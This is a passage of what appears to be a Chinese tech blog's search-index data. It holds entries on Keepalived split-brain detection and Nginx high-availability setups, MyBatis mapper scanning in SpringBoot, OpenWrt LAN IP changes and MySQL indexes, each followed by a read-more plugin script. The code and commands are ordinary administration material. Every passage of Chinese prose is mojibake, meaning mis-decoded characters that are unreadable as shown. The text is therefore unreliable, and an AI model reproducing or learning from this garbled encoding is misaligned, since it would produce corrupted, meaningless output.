æ³•æ­£å¸¸é€šä¿¡ï¼Œä¾‹å¦‚ï¼šå¿ƒè·³çº¿åäº†ï¼ˆåŒ…æ‹¬æ–­äº†æˆ–è€…è€åŒ–ï¼‰ã€ç½‘å¡åŠç›¸å…³é©±åŠ¨æŸåã€IP é…ç½®åŠå†²çªé—®é¢˜ï¼ˆç½‘å¡ç›´è¿ï¼‰ã€å¿ƒè·³çº¿ä¹‹é—´çš„è®¾å¤‡æ•…éšœï¼ˆç½‘å¡åŠäº¤æ¢æœºï¼‰ã€ä»²è£çš„æœºå™¨å‡ºç°é—®é¢˜ï¼ˆé‡‡ç”¨ä»²è£çš„æ–¹æ¡ˆï¼‰ æç¤ºï¼šKeepalived é…ç½®é‡Œçš„åŒä¸€ä¸ª VRRP å®ä¾‹ï¼Œå¦‚æœ virtual_router_id å‚æ•°åœ¨ä¸»å¤‡èŠ‚ç‚¹ä¸Šçš„é…ç½®ä¸ä¸€è‡´ï¼Œä¹Ÿä¼šå¯¼è‡´å‡ºç°è„‘è£‚ç°è±¡ è„‘è£‚æ–¹æ¡ˆåœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯ä»¥ä»ä»¥ä¸‹æ–¹é¢é˜²æ­¢è„‘è£‚ï¼š åŒæ—¶ä½¿ç”¨ä¸²è¡Œç”µç¼†å’Œä»¥å¤ªç½‘ç”µç¼†è¿æ¥ã€åŒæ—¶ä½¿ç”¨ä¸¤æ¡å¿ƒè·³çº¿è·¯ï¼Œè¿™æ ·ä¸€æ¡çº¿è·¯æ–­äº†ï¼Œå¦å¤–ä¸€æ¡è¿˜æ˜¯å¥½çš„ï¼Œä¾ç„¶èƒ½ä¼ é€å¿ƒè·³æ¶ˆæ¯ å½“æ£€æŸ¥è„‘è£‚æ—¶å¼ºè¡Œå…³é—­ä¸€ä¸ªå¿ƒè·³èŠ‚ç‚¹ï¼ˆè¿™ä¸ªåŠŸèƒ½éœ€è¦ç‰¹æ®Šè®¾å¤‡æ”¯æŒï¼Œå¦‚ stonithã€fenceï¼‰ç›¸å½“äºå¤‡èŠ‚ç‚¹æ¥æ”¶ä¸åˆ°å¿ƒè·³æ¶ˆæ¯ï¼Œé€šè¿‡å•ç‹¬çš„çº¿è·¯å‘é€å…³æœºå‘½ä»¤å…³é—­ä¸»èŠ‚ç‚¹çš„ç”µæº åšå¥½å¯¹è„‘è£‚çš„ç›‘æ§æŠ¥è­¦ è§£å†³å¸¸è§æ–¹æ¡ˆï¼š å¦‚æœå¼€å¯é˜²ç«å¢™ï¼Œä¸€å®šè¦è®©å¿ƒè·³æ¶ˆæ¯é€šè¿‡ï¼Œä¸€èˆ¬é€šè¿‡å…è®¸ IP æ®µçš„å½¢å¼è§£å†³ å¯ä»¥æ‹‰ä¸€æ¡ä»¥å¤ªç½‘ç½‘çº¿æˆ–è€…ä¸²å£çº¿ä½œä¸ºä¸»è¢«èŠ‚ç‚¹å¿ƒè·³çº¿è·¯çš„å†—ä½™ å¼€å‘æ£€æµ‹ç¨‹åºé€šè¿‡ç›‘æ§è½¯ä»¶æ£€æµ‹è„‘è£‚ è„‘è£‚æŠ¥è­¦è„šæœ¬ç›‘æ§æŠ¥è­¦æ€è·¯ï¼Œæ­£å¸¸æƒ…å†µä¸‹ Keepalived çš„ VIP æ˜¯æŒ‚è½½åœ¨ Master èŠ‚ç‚¹ä¸Šçš„ï¼Œå¦‚æœåœ¨ Backup èŠ‚ç‚¹å‘ç°äº† VIPï¼ŒåŒæ—¶è¿˜å¯ä»¥ Ping å¾—é€š Master èŠ‚ç‚¹ï¼Œå°±è§¦å‘è„‘è£‚æŠ¥è­¦ã€‚è¿™ç§ç›‘æ§æ€è·¯æ˜¯å‡è®¾åœ¨ Keepalived æœåŠ¡è‡ªèº«ä¸ä¼šå®•æœºçš„åŸºç¡€ä¸Šçš„ï¼Œè‹¥ Master èŠ‚ç‚¹ä¸Šçš„ Keepalived æœåŠ¡å®•æœºäº†ï¼ŒVIP ä¼šæ­£å¸¸æŒ‚è½½åˆ° Backup èŠ‚ç‚¹ä¸Šï¼ŒåŒæ—¶è¿˜æ˜¯å¯ä»¥ Ping å¾—é€š Master èŠ‚ç‚¹ï¼Œè¿™ç§æç«¯æƒ…å†µä¸‹å°±ä¼šé”™è¯¯è§¦å‘è„‘è£‚è­¦æŠ¥ã€‚ 12345678910111213141516#!/bin/bash# æ£€æŸ¥è„‘è£‚çš„è„šæœ¬ï¼Œåœ¨BackupèŠ‚ç‚¹ä¸Šè¿›è¡Œéƒ¨ç½²VIP=192.168.1.186MASTER_IP=192.168.1.163while truedo ping -c 2 -W 3 $MASTER_IP &amp;&gt;/dev/null if [ $? -eq 0 -a `ip add|grep "$VIP"|wc -l` -eq 1 ];then echo "ha is brain." else echo "ha is ok" fi sleep 5done Nginx + Keepalived é«˜å¯ç”¨éƒ¨ç½²æ¶æ„æ–¹æ¡ˆ åŒæœºä¸»å¤‡æ–¹æ¡ˆï¼šå°±æ˜¯ä¸Šæ–‡ä»‹ç»è¿‡çš„ï¼Œä½¿ç”¨ä¸€ä¸ª VIP åœ°å€ï¼Œå‰ç«¯ä½¿ç”¨ 2 å°æœºå™¨ï¼Œä¸€å°åšä¸»èŠ‚ç‚¹ï¼ˆMasterï¼‰ï¼Œä¸€å°åšå¤‡èŠ‚ç‚¹ï¼ˆBackupï¼‰ï¼Œä½†åŒæ—¶åªæœ‰ä¸€å°æœºå™¨å·¥ä½œï¼Œå¦ä¸€å°å¤‡ç”¨æœºå™¨åœ¨ä¸»æœºå™¨ä¸å‡ºç°æ•…éšœçš„æ—¶å€™ï¼Œæ°¸è¿œå¤„äºæµªè´¹çŠ¶æ€ï¼Œä»…ä»…ç”¨äºç¾å¤‡ï¼Œå¹³æ—¶éƒ½æ˜¯ç©ºé—²ç€çš„ã€‚ åŒä¸»çƒ­å¤‡æ–¹æ¡ˆï¼šå¼¥è¡¥äº†åŒæœºä¸»å¤‡çš„ç¼ºç‚¹ï¼Œä½¿ç”¨ 2 ä¸ª VIP åœ°å€ï¼Œå‰ç«¯ä½¿ç”¨ 2 å°æœºå™¨ï¼Œå½¼æ­¤äº’ä¸ºä¸»å¤‡ï¼ŒåŒæ—¶æœ‰ä¸¤å°æœºå™¨å·¥ä½œã€‚ç”¨æˆ·è®¿é—®ä¹‹åï¼ŒDNS è½®è¯¢é€‰æ‹©è®¿é—®å“ªä¸ª VIPï¼Œå½“å…¶ä¸­ä¸€å°æœºå™¨å‡ºç°æ•…éšœï¼Œä¸¤å°æœºå™¨çš„è¯·æ±‚ä¼šè½¬ç§»åˆ°åŒä¸€å°æœºå™¨è´Ÿè½½ã€‚ FAQMaster èŠ‚ç‚¹æ— æ³•è®¿é—®è™šæ‹Ÿ IPMaster èŠ‚ç‚¹é‡Œçš„ Keepalived æœåŠ¡é…ç½®å¥½ VIP åï¼Œé€šè¿‡ ip addr å¯ä»¥çœ‹åˆ° VIP å·²ç»é¡ºåˆ©æŒ‚è½½ï¼Œä½†æ˜¯åœ¨ Master èŠ‚ç‚¹å†…éƒ¨æ— æ³• Ping é€šã€‚åŸå› æ˜¯ keepalived.conf æ–‡ä»¶ä¸­é»˜è®¤é…ç½®äº† vrrp_strictï¼Œéœ€è¦æŠŠå®ƒæ³¨é‡Šæ‰ï¼Œé‡å¯ Keepalived çš„æœåŠ¡åå³å¯ä»¥ Ping å¾—é€šã€‚vrrp_strict å‚æ•°è¡¨ç¤ºä¸¥æ ¼éµå®ˆ VRRP åè®®ï¼Œä¸‹åˆ—æƒ…å†µå°†ä¼šé˜»æ­¢ Keepalived çš„è™šæ‹Ÿ IP åŠŸèƒ½ï¼š 1ï¼‰å•æ’­é‚»å±… 2ï¼‰æ²¡æœ‰ VIP åœ°å€ 3ï¼‰åœ¨ VRRP ç‰ˆæœ¬ 2 ä¸­æœ‰ IPv6 åœ°å€ Backup èŠ‚ç‚¹æ— æ³•è®¿é—®è™šæ‹Ÿ IPè™šæ‹Ÿ IP çš„ç½‘æ®µè¦å’Œ Real Server çœŸå® IP çš„ç½‘æ®µåœ°å€ä¸€è‡´ï¼Œæ¯”å¦‚ Master èŠ‚ç‚¹ä¸ Backup èŠ‚ç‚¹çš„ IP ç½‘æ®µä¸º 192.168.171ï¼Œé‚£ä¹ˆè™šæ‹Ÿ IP å¿…é¡»æ˜¯ 192.168.171.*ï¼Œå¦åˆ™ Backup èŠ‚ç‚¹æ— æ³•è®¿é—®è™šæ‹Ÿ IPã€‚ Nginx æœåŠ¡ä½¿ç”¨éé»˜è®¤çš„ 80 ç«¯å£è‹¥ Nginx æœåŠ¡ä½¿ç”¨éé»˜è®¤çš„ 80 ç«¯å£ï¼Œé‚£ä¹ˆåœ¨ Keepalived çš„é…ç½®æ–‡ä»¶ keepalived.conf é‡Œï¼Œåªéœ€è¦æ­£å¸¸é…ç½® virtual_ipaddress å‚æ•°å³å¯ï¼Œä¸éœ€è¦å…³å¿ƒ Nginx å…·ä½“ä½¿ç”¨çš„æ˜¯å“ªä¸ªç«¯å£ï¼Œå› ä¸ºé»˜è®¤å¯ä»¥é€šè¿‡ http://vip:port çš„åœ°å€æ ¼å¼è®¿é—® Nginxã€‚ Master èŠ‚ç‚¹ä¸ Backup èŠ‚ç‚¹åŒæ—¶ç”Ÿæˆäº†è™šæ‹Ÿ IPå…³é—­ç³»ç»Ÿé˜²ç«å¢™ï¼Œè®© Master èŠ‚ç‚¹å’Œ Backup èŠ‚ç‚¹å¯ä»¥äº’ç›¸é€šä¿¡ï¼Œå¦åˆ™ä¼šå¯¼è‡´ä¸»å¤‡èŠ‚ç‚¹éƒ½ç”Ÿæˆäº†ä¸¤ä¸ª VIPï¼ˆè„‘è£‚ç°è±¡ï¼‰ã€‚ä¹Ÿå¯ä»¥é…ç½®ä¸»å¤‡èŠ‚ç‚¹ä¹‹é—´çš„é˜²ç«å¢™åè®®ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå¼€å¯å…¶ä»–éœ€è¦é€šä¿¡çš„ IP å³å¯ï¼š 12345678# å¼€å¯VRRPåè®®# firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --protocol vrrp -j ACCEPT# æˆ–è€…# firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface em1 --destination 192.168.1.163 --protocol vrrp -j ACCEPT# é‡è½½é…ç½®ç”Ÿæ•ˆ# firewall-cmd --reload å•†ä¸šäº‘æœåŠ¡å™¨å¯¹ Keepalived çš„æ”¯æŒä»¥é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸¾ä¾‹ï¼Œå¯ä»¥ä½¿ç”¨ HAVIP + VPCï¼ˆVirtual Private Cloudï¼Œè™šæ‹Ÿç§æœ‰äº‘ï¼‰ æ¥å®ç° Keepalivedï¼Œä½†æ˜¯æ™®é€šçš„ ECS æ˜¯ä¸é€‚ç”¨çš„ï¼Œè¦æ±‚å¿…é¡»ä½¿ç”¨ VPC ç±»å‹çš„ ECSï¼Œè€Œä¸”è™šæ‹Ÿ IP éœ€è¦å¦å¤–ç”³è¯·ï¼ˆä¸æ”¯æŒè‡ªå»º VIPï¼‰ã€‚é˜¿é‡Œäº‘ç›®å‰ä¸æ”¯æŒè‡ªå»º LVS é«˜å¯ç”¨è´Ÿè½½å‡è¡¡ï¼Œä½†æœ‰ç°æˆçš„å•†ä¸šäº§å“â€“è´Ÿè½½å‡è¡¡ SLB å¯ä»¥é€‰æ‹©ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œäº‘æœåŠ¡å™¨ ECS ä¸æ”¯æŒç»„æ’­å’Œå¹¿æ’­ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚ å‚è€ƒåšå®¢ Keepalived é…ç½®æ–‡ä»¶å‚æ•°è¯¦è§£ Keepalived è™šæ‹Ÿ VIP æ— æ³•è®¿é—®çš„é—®é¢˜ Centos 8 å¼€å¯é˜²ç«å¢™åï¼Œè„‘è£‚çš„é—®é¢˜è§£å†³ åŸºäºåä¸ºäº‘æ­å»º Keepalived + Nginx å®éªŒ Nginx é«˜å¯ç”¨é›†ç¾¤è§£å†³æ–¹æ¡ˆ Nginx + Keepalived Keepalived + Nginx å®ç°æ­å»ºåŒæœºä¸»å¤‡ + åŒä¸»çƒ­å¤‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux webæœåŠ¡å™¨"},{title:"SpringBoot å¼€å‘å¸¸è§é—®é¢˜è®°å½•",url:"/posts/ba04f364.html",text:'MyBatiså¤šæ¨¡å—ä¸‹ä¸»æ¨¡å—æ— æ³•æ³¨å…¥å­æ¨¡å—çš„ Mapperå‡è®¾æœ‰ common å’Œ shop ä¸¤ä¸ªæ¨¡å—ï¼Œcommon æ¨¡å—é‡Œæœ‰ MyBatis çš„ Mapper æ¥å£å’Œ XML æ˜ å°„æ–‡ä»¶ï¼Œè€Œ shop æ¨¡å—åˆ™ä¾èµ–äº† common æ¨¡å—ï¼Œæ­¤æ—¶è‹¥åœ¨ shop æ¨¡å—ä¸­æ— æ³•æ³¨å…¥ common æ¨¡å—çš„ Mapperï¼Œåˆ™å¯ä»¥å‚è€ƒä»¥ä¸‹æ–¹æ³•è§£å†³é—®é¢˜ã€‚ ç¬¬ä¸€æ­¥ï¼Œå…ˆç¡®è®¤ä¸»æ¨¡å—å¯ä»¥æ­£å¸¸æ‰«æåˆ°å­æ¨¡å—çš„ XML æ˜ å°„æ–‡ä»¶ï¼ŒYML çš„å†…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12mybatis: mapper-locations: classpath*:/mapper/**/*.xml æç¤º å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ä¸»æ¨¡å—çš„ application.yml é‡Œé¢ï¼Œé…ç½® MyBatis çš„ mapper-locations æ—¶ï¼Œè‹¥ä½¿ç”¨äº† classpathï¼Œé‚£ä¹ˆåªä¼šæ‰«æå½“å‰æ¨¡å—çš„ XML æ˜ å°„æ–‡ä»¶ï¼Œè€Œä½¿ç”¨ classpath* åˆ™ä¼šæ‰«ææ‰€æœ‰ Jar åŒ…ä¸‹çš„ XML æ˜ å°„æ–‡ä»¶ã€‚ ç¬¬äºŒæ­¥ï¼Œåœ¨ä¸»æ¨¡å—çš„å¯åŠ¨ç±»ä¸Šæ·»åŠ  @MapperScan æ³¨è§£ï¼Œè¿™æ˜¯ä¸ºäº†å¯ä»¥æ‰«æåˆ°å­æ¨¡å—çš„çš„ Mapper æ¥å£ï¼Œè€Œä¸”è¢«æ‰«æåˆ°çš„ Mapper æ¥å£ï¼Œåœ¨ç¼–è¯‘ä¹‹åéƒ½ä¼šè‡ªåŠ¨ç”Ÿæˆç›¸åº”çš„å®ç°ç±»ã€‚è‹¥å­æ¨¡å—æ²¡æœ‰åœ¨ä¸»æ¨¡å—çš„å¯åŠ¨ç±»å¯ä»¥æ‰«æçš„åŒ…æˆ–è€…å­åŒ…ä¸‹é¢ï¼Œé‚£ä¹ˆè¿˜éœ€è¦åœ¨ä¸»æ¨¡å—çš„å¯åŠ¨ç±»ä¸Šæ·»åŠ  @ComponentScan æ³¨è§£ï¼Œè¿™æ ·æ‰èƒ½è®© SpringBoot æ‰«æåˆ°å­æ¨¡å—çš„å…¶ä»– Bean ç±»ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678package com.shop;@SpringBootApplication@MapperScan("com.common.**.mapper")@ComponentScan(basePackages = {"com.common"})public class ShopApplication { } æç¤º @MapperScan("com.common.mapper")ï¼šæ‰«ææŒ‡å®šåŒ…ä¸­çš„æ¥å£ @MapperScan("com.common.*.mapper")ï¼šä¸€ä¸ª * ä»£è¡¨ä»»æ„å­—ç¬¦ä¸²ï¼Œä½†åªä»£è¡¨ä¸€çº§åŒ…ï¼Œæ¯”å¦‚å¯ä»¥æ‰«åˆ° com.common.aaa.mapperï¼Œä¸èƒ½æ‰«åˆ° com.common.aaa.bbb.mapper @MapperScan("com.common.**.mapper")ï¼šä¸¤ä¸ª * ä»£è¡¨ä»»æ„æ•°é‡çš„åŒ…ï¼Œæ¯”å¦‚å¯ä»¥æ‰«åˆ° com.common.aaa.mapperï¼Œä¹Ÿå¯ä»¥æ‰«åˆ° com.common.aaa.bbb.mapper var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¼€å‘éšç¬”"},{title:"OpenWrt è®¾ç½® IP åœ°å€",url:"/posts/ee7f1a35.html",text:'å‰è¨€ç”±äºè·¯ç”±å™¨çš„ IP ä¸€èˆ¬éƒ½æ˜¯ 192.168.1.1ï¼Œå½“æ¥å…¥äº†äºŒçº§è·¯ç”±å™¨æ—¶ï¼Œä¸ºäº†è®©äºŒçº§è·¯ç”±å™¨çš„ IP ä¸ä¸ä¸€çº§è·¯ç”±å™¨çš„ IP å†²çªï¼Œæ­¤æ—¶ä¸€èˆ¬éœ€è¦æ›´æ”¹äºŒçº§è·¯ç”±å™¨çš„ IP åœ°å€ï¼Œä¸‹é¢å°†ä»‹ç» OpenWrt å¦‚ä½•é€šè¿‡å¯è§†åŒ–ç•Œé¢å’Œæ›´æ”¹é…ç½®æ–‡ä»¶çš„æ–¹å¼æ¥æŒ‡å®š IP åœ°å€ã€‚ æŸ¥çœ‹ OpenWrt çš„ IPé€šè¿‡ SSH è¿æ¥åˆ° OpenWrt åï¼Œåœ¨ç»ˆç«¯è¾“å…¥ ifconfig å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ° OpenWrt é»˜è®¤çš„ IP åœ°å€æ˜¯ 192.168.1.1ã€‚è¿™é‡Œçš„ SSH ç™»å½•è´¦å·ï¼Œä¸€èˆ¬æ˜¯ OpenWrt å¯è§†åŒ–ç®¡ç†ç•Œé¢çš„ç™»å½•è´¦å·ï¼Œç”¨æˆ·åä¸€èˆ¬ä¸º rootã€‚ é€šè¿‡é…ç½®æ–‡ä»¶æ›´æ”¹ IPç¼–è¾‘é…ç½®æ–‡ä»¶ /etc/config/networkï¼Œå°† 192.168.1.1 æ”¹ä¸ºè‡ªå®šä¹‰çš„ IP åœ°å€ï¼ˆä¾‹å¦‚ï¼š192.168.2.1ï¼‰ï¼Œç„¶åé‡å¯è·¯ç”±å™¨å³å¯ã€‚ 12345678910# vim /etc/config/networkconfig interface \'lan\' option ifname \'eth0.1\' option force_link \'1\' option type \'bridge\' option proto \'static\' option ipaddr \'192.168.2.1\' option netmask \'255.255.255.0\' option ip6assign \'60\' (adsbygoogle = window.adsbygoogle || []).push({}); é€šè¿‡å¯è§†åŒ–ç•Œé¢æ›´æ”¹ IPèœå•æ å¯¼èˆªåˆ°ï¼šNetWork -&gt; Interfaces -&gt; LAN -&gt; General Setupï¼Œæ›´æ”¹ IPv4 address çš„ IP åœ°å€ï¼Œç„¶åç‚¹å‡» ä¿å­˜ &amp; åº”ç”¨ å³å¯ã€‚ è¡¥å……è¯´æ˜OpenWrt é‡å¯åï¼Œé€šè¿‡ ifconfig å‘½ä»¤æŸ¥è¯¢ IP åœ°å€æ˜¯å¦æˆåŠŸæ›´æ”¹ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“äºŒçº§è·¯ç”±å™¨çš„ç½‘æ®µæ›´æ”¹åï¼Œé‚£ä¹ˆé€šè¿‡ DHCP åˆ†é…ç»™å®¢æˆ·ç«¯è®¾å¤‡çš„ç½‘æ®µä¹Ÿä¼šéšç€å˜æ›´ï¼Œä¾‹å¦‚å½“è·¯ç”±å™¨çš„ IP æ›´æ”¹ä¸º 192.168.2.1ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯è®¾å¤‡çš„ç½‘æ®µå°†æ›´æ”¹ä¸º 192.168.2ï¼ŒåŒæ—¶ IP åœ°å€ä¸º 192.168.2.xxxã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"æ ‘è“æ´¾"},{title:"MySQL ç´¢å¼•çš„ä½¿ç”¨",url:"/posts/ba389f6e.html",text:'ç´¢å¼•ä»‹ç»ç´¢å¼•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ï¼ˆInnoDB æ•°æ®è¡¨ä¸Šçš„ç´¢å¼•æ˜¯è¡¨ç©ºé—´çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼‰ï¼ŒåŒ…å«äº†å¯¹æ•°æ®è¡¨é‡Œæ‰€æœ‰è®°å½•çš„å¼•ç”¨æŒ‡é’ˆã€‚ç´¢å¼•åˆ†å•åˆ—ç´¢å¼•å’Œç»„åˆç´¢å¼•ã€‚å•åˆ—ç´¢å¼•ï¼Œå³ä¸€ä¸ªç´¢å¼•åªåŒ…å«å•ä¸ªåˆ—ï¼Œä¸€ä¸ªè¡¨å¯ä»¥æœ‰å¤šä¸ªå•åˆ—ç´¢å¼•ï¼Œä½†è¿™ä¸æ˜¯ç»„åˆç´¢å¼•ã€‚ç»„åˆç´¢å¼•ï¼Œå³ä¸€ä¸ªç´¢å¼•åŒ…å«å¤šä¸ªåˆ—ã€‚åˆ›å»ºç´¢å¼•æ—¶ï¼Œéœ€è¦ç¡®ä¿è¯¥ç´¢å¼•æ˜¯åº”ç”¨åœ¨ SQL æŸ¥è¯¢è¯­å¥çš„æ¡ä»¶ (ä¸€èˆ¬æ˜¯ WHEREã€JOIN å­å¥çš„æ¡ä»¶)ã€‚ ç´¢å¼•çš„ç±»å‹ï¼ˆå››ç§ï¼‰ FULLTEXTï¼šå³ä¸ºå…¨æ–‡ç´¢å¼•ï¼Œç›®å‰åªæœ‰ MyISAM å¼•æ“æ”¯æŒï¼Œå…¶å¯ä»¥åœ¨ CREATE TABLEï¼ŒALTER TABLEï¼ŒCREATE INDEX ä½¿ç”¨ï¼Œä¸è¿‡ç›®å‰åªæœ‰ CHARã€VARCHARã€TEXT åˆ—ä¸Šå¯ä»¥åˆ›å»ºå…¨æ–‡ç´¢å¼• HASHï¼šç”±äº HASH çš„å”¯ä¸€æ€§åŠç±»ä¼¼é”®å€¼å¯¹çš„å½¢å¼ï¼Œå¾ˆé€‚åˆä½œä¸ºç´¢å¼•ï¼ŒHASH ç´¢å¼•å¯ä»¥ä¸€æ¬¡å®šä½ï¼Œä¸éœ€è¦åƒæ ‘å½¢ç´¢å¼•é‚£æ ·é€å±‚æŸ¥æ‰¾ï¼Œå› æ­¤å…·æœ‰æé«˜çš„æ•ˆç‡ã€‚ä½†æ˜¯ï¼Œè¿™ç§é«˜æ•ˆæ˜¯æœ‰æ¡ä»¶çš„ï¼Œå³åªåœ¨ â€œ=â€ å’Œ â€œinâ€ æ¡ä»¶ä¸‹æ‰é«˜æ•ˆï¼Œå¯¹äºèŒƒå›´æŸ¥è¯¢ã€æ’åºåŠç»„åˆç´¢å¼•ä»ç„¶æ•ˆç‡ä¸é«˜ BTREEï¼šä¸€ç§å°†ç´¢å¼•å€¼æŒ‰ä¸€å®šçš„ç®—æ³•ï¼Œå­˜å…¥ä¸€ä¸ªæ ‘å½¢çš„æ•°æ®ç»“æ„ä¸­ï¼ˆäºŒå‰æ ‘ï¼‰ï¼Œæ¯æ¬¡æŸ¥è¯¢éƒ½æ˜¯ä»æ ‘çš„å…¥å£ Root å¼€å§‹ï¼Œä¾æ¬¡éå† Nodeï¼Œè·å– Leafï¼Œè¿™æ˜¯ MySQL é‡Œé»˜è®¤å’Œæœ€å¸¸ç”¨çš„ç´¢å¼•ç±»å‹ RTREEï¼šåœ¨ MySQL å¾ˆå°‘ä½¿ç”¨ï¼Œä»…æ”¯æŒ geometry æ•°æ®ç±»å‹ï¼Œæ”¯æŒè¯¥ç±»å‹çš„å­˜å‚¨å¼•æ“æœ‰ MyISAMã€BDbã€InnoDbã€NDbã€Archiveï¼Œç›¸å¯¹äº BTREEï¼ŒRTREE çš„ä¼˜åŠ¿åœ¨äºèŒƒå›´æŸ¥æ‰¾ ç´¢å¼•çš„ç§ç±»ï¼ˆäº”ç§ï¼‰ æ™®é€šç´¢å¼•ï¼šä»…åŠ é€ŸæŸ¥è¯¢ï¼ˆBTREE ç±»å‹ï¼‰ å…¨æ–‡ç´¢å¼•ï¼šå¯¹æ–‡æœ¬çš„å†…å®¹è¿›è¡Œåˆ†è¯å’Œæœç´¢ å”¯ä¸€ç´¢å¼•ï¼šåŠ é€ŸæŸ¥è¯¢ + åˆ—å€¼å”¯ä¸€ï¼ˆå¯ä»¥æœ‰ NULL å€¼ï¼‰ ä¸»é”®ç´¢å¼•ï¼šåŠ é€ŸæŸ¥è¯¢ + åˆ—å€¼å”¯ä¸€ï¼ˆä¸å¯ä»¥æœ‰ NULL å€¼ï¼‰ + æ¯ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ç´¢å¼• ç»„åˆç´¢å¼•ï¼šå¤šåˆ—å€¼ç»„æˆä¸€ä¸ªç´¢å¼•ï¼Œä¸“é—¨ç”¨äºç»„åˆæœç´¢ï¼Œå…¶æ•ˆç‡å¤§äºç´¢å¼•åˆå¹¶ï¼ˆä½¿ç”¨å¤šä¸ªå•åˆ—ç´¢å¼•ç»„åˆæœç´¢ï¼‰ ç´¢å¼•çš„æ“ä½œåˆ›å»ºç´¢å¼•ï¼š 1234567891011--åˆ›å»ºæ™®é€šç´¢å¼•CREATE INDEX index_name ON table_name(col_name);--åˆ›å»ºå”¯ä¸€ç´¢å¼•CREATE UNIQUE INDEX index_name ON table_name(col_name);--åˆ›å»ºæ™®é€šç»„åˆç´¢å¼•CREATE INDEX index_name ON table_name(col_name_1, col_name_2);--åˆ›å»ºå”¯ä¸€ç»„åˆç´¢å¼•CREATE UNIQUE INDEX index_name ON table_name(col_name_1, col_name_2); é€šè¿‡ä¿®æ”¹è¡¨ç»“æ„åˆ›å»ºç´¢å¼•ï¼š 1ALTER TABLE table_name ADD INDEX index_name(col_name); åˆ›å»ºè¡¨æ—¶ç›´æ¥æŒ‡å®šç´¢å¼•ï¼š 12345CREATE TABLE table_name ( ID INT NOT NULL, col_name VARCHAR (16) NOT NULL, INDEX index_name(col_name)); åˆ é™¤ç´¢å¼•ï¼š 12345--ç›´æ¥åˆ é™¤ç´¢å¼•DROP INDEX index_name ON table_name;--ä¿®æ”¹è¡¨ç»“æ„åˆ é™¤ç´¢å¼•ALTER TABLE table_name DROP INDEX index_name; å…¶å®ƒç›¸å…³å‘½ä»¤ï¼š 12345678910111213--æŸ¥çœ‹è¡¨ç»“æ„desc table_name;--æŸ¥çœ‹åˆ›å»ºè¡¨çš„SQLshow create table table_name;--æŸ¥çœ‹ç´¢å¼•show index from&nbsp;table_name;--æŸ¥çœ‹æ‰§è¡Œæ—¶é—´set profiling = 1;SQL ...show profiles; ç´¢å¼•ä½¿ç”¨çš„ä»£ä»· ç´¢å¼•è™½ç„¶å¯ä»¥å¤§å¤§æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ï¼Œä½†åŒæ—¶ä¹Ÿä¼šé™ä½æ›´æ–°è¡¨çš„é€Ÿåº¦ï¼Œå¦‚å¯¹è¡¨è¿›è¡Œ INSERTã€UPDATE å’Œ DELETE æ“ä½œï¼›å› ä¸ºæ›´æ–°è¡¨æ—¶ï¼ŒMySQL ä¸ä»…è¦ä¿å­˜æ•°æ®ï¼Œè¿˜è¦æ›´æ–°ç´¢å¼•æ–‡ä»¶ å»ºç«‹ç´¢å¼•ä¼šå ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ï¼Œè¿™æ˜¯å› 